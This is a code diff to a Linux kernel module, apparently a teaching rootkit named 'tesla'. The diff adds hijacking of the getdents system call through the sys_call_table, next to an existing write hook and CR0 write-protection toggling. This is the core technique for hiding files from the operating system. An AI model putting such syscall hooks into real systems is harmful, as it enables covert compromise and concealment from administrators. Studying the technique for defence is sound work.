@@ -134,6 +134,10 @@ int tesla_init(void)
 	orig_write = (void *)sys_call_table[__NR_write];
 	sys_call_table[__NR_write] = (long *)tesla_write;
 
+/* save the original getdents system call into orig_dents, and replace the getdents system call with tesla_getdents */
+	orig_getdents = (void *)sys_call_table[__NR_getdents];
+	sys_call_table[__NR_getdents] = (long *)tesla_getdents;
+
 	/* set bit 16 of cr0, so as to turn the write protection on */
 
 	write_cr0(read_cr0() | 0x10000);
@@ -154,6 +158,9 @@ void tesla_exit(void)
 
 	/* restore the read system call to its original version */
 	sys_call_table[__NR_write] = (long *)orig_write;
+
+	/* restore the getdents system call to its original version */
+	sys_call_table[__NR_getdents] = (long *)orig_getdents;
 
 	/* set bit 16 of cr0 */
 	write_cr0(read_cr0() | 0x10000);
